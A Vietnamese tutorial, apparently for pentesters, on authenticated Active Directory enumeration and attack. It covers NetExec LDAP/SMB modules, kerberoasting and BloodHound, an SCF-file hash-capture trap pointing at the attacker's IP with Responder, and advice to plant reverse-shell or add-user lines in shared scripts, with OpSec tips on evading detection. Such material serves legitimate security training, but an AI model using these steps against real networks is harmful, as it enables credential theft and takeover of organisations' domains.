Khi bạn có tài khoản nhưng không thể "vào" được máy nào, đừng nản lòng. Active Directory là một cơ sở dữ liệu khổng lồ, và chỉ cần một tài khoản hợp lệ, bạn có quyền truy vấn gần như mọi ngóc ngách của nó thông qua các giao thức như LDAP, SMB và RPC.

### **1. LDAP**

* **Thực tế**: Là bước bắt buộc để tìm đường đi tiếp.
* **OpSec**: Rất an toàn. Các truy vấn LDAP là hành vi bình thường của mọi máy tính trong mạng.

LDAP là kho báu lớn nhất. Thay vì dùng tay, ta dùng **NetExec** để tự động hóa việc liệt kê:

```bash
nxc ldap <DC_IP> -M <module>
```

Các module nên thử lúc này:
* whoami: Xem thông tin người dùng hiện tại.
* get-desc-users, get-info-users: Lấy mô tả và thông tin (có thể chứa mật khẩu) của mọi người dùng (nếu có).

Ngoài module còn có các cờ đáng tiền như:
* --kerberoasting: Tìm các tài khoản dịch vụ (SPN) để lấy vé dịch vụ (TGS) và crack hash. Đây là cách phổ biến nhất để lấy được mật khẩu của các tài khoản có đặc quyền cao.
* --password-not-required: Liệt kê các user hớ hênh đến mức không cài mật khẩu.
* --gmsa: Kiểm tra các tài khoản GMSA. Nếu cấu hình sai, bạn có thể lấy được mật khẩu của các tài khoản dịch vụ này.
* --bloodhound -c All -d <tên_miền> --dns-server <DC_IP>: Đây là vũ khí tối thượng. Nó tự động thu thập mọi mối quan hệ trong AD (ai có quyền trên máy nào, nhóm nào quản lý nhóm nào). Dữ liệu này nạp vào tool **BloodHound** sẽ chỉ cho bạn con đường ngắn nhất để làm trùm.

### **2. SMB**

* **Thực tế:** Cực kỳ hiệu quả. Admin thường quên xóa các file registry.xml (GPP) hoặc file backup mật khẩu.
* **OpSec:** Thấp. Việc liệt kê hàng loạt share ẩn (C$, Admin$) có thể đánh động EDR/SOC.

Nếu LDAP là cuốn danh bạ, thì SMB là cái kho chứa đồ. Ngay cả khi chưa có shell, quyền truy cập vào các thư mục chia sẻ có thể giúp bạn tìm thấy mật khẩu hoặc các file cấu hình nhạy cảm.

```bash
nxc smb <DC_IP> -M <module>
```

Các module nên thử:
* gpp_password: Tìm mật khẩu được lưu trong các file cấu hình Group Policy. Bạn vẫn nên tự tay tìm bằng **smbclient**.
* gpp_autologin: Tìm các tài khoản được cấu hình tự động đăng nhập (thường chứa mật khẩu rõ ràng trong Registry).
* spider_plus: Crawl và tạo bản đồ file trong thư mục chia sẻ.

Và các cờ:
* --loggedon-users: Xem ai đang đăng nhập trên máy nào. Nếu thấy một Domain Admin đang đăng nhập ở một máy trạm mà bạn có quyền Admin, đó chính là mục tiêu để bạn nhảy sang.
* --shares: Liệt kê thư mục chia sẻ và quyền của bạn trên thư mục đó

Nếu bạn may mắn tìm thấy một thư mục chia sẻ mà tài khoản của bạn có quyền ghi (Write), đó không chỉ là nơi để đọc file, mà là một bãi săn hoàn hảo.

Thay vì tấn công trực diện, ta đặt các file mồi vào thư mục dùng chung. Khi bất kỳ ai dùng File Explorer mở thư mục đó lên, máy tính của họ sẽ tự động cố gắng tải icon từ máy tấn công của bạn.
* Tạo file sus.scf trên máy tấn công:

```bash
[Shell]
Command=2
IconFile=\\<IP_máy_tấn_công>\share\sus.ico
[Taskbar]
Command=ToggleDesktop
```

* Bật **Responder**

```bash
sudo responder -I eth0 -v
```

* Thả mồi bằng **smbclient**

```bash
smbclient //<IP_mục_tiêu>/<Share> -U <user>%<pass>
put sus.scf
```

Nếu bạn thấy trong Share có các file script tự động (.bat, .ps1, .vbs) hoặc các file .exe mà người dùng thường xuyên chạy (ví dụ: bộ cài phần mềm nội bộ), bạn nhồi thêm một dòng lệnh độc hại (ví dụ: tạo user mới hoặc gọi một reverse shell) vào cuối script đó thì khi một người dùng có đặc quyền cao chạy script này để bảo trì máy, họ sẽ vô tình thực thi luôn lệnh của bạn dưới quyền của họ. Bạn cũng có thể tải file .exe về, decompile nó bằng **dnSpy** để tìm thông tin xác thực bị gán cứng.
